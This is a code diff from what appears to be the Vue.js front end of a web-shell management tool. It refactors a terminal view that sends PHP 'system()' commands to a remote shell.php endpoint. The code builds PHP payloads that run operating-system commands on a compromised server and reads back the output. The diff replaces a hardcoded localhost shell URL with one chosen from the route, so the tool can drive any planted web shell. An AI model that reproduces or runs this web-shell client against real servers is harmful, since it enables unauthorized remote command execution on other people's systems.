@@ -81,13 +81,7 @@
             }
         },
         created() {
-            let search = location.search.substr(1).split('&')
-            let param = search.reduce((p, c, i) => {
-                let t = c.split('=')
-                p[t[0]] = t[1]
-                return p
-            }, {})
-            this.getPwd(param)
+            this.getPwd()
         },
         directives: {
             focus: {
@@ -118,17 +112,16 @@
                 }
             },
             async getPwd() {
-                let that = this
+                let shell = this.$route.query.shell
+
                 let cmd = 'echo %25cd%25'
                 let phpCode = 'header("Content-Type: text/html;charset=GBK");system(\'' + cmd + ' 2>%261\');'
-                let res = await this.$request('http://localhost/shell.php?c=' + phpCode)
-                console.log(JSON.stringify(res))
+                let res = await this.$request(this.$geneShellUrl(shell) + phpCode)
                 res = res.replace('\r\n', '')
-                console.log(JSON.stringify(res))
-                that.path = res
-                that.type = {
-                    path: that.path + '>',
-                    input: that.path + '>',
+                this.path = res
+                this.type = {
+                    path: this.path + '>',
+                    input: this.path + '>',
                     id: '',
                 }
             },
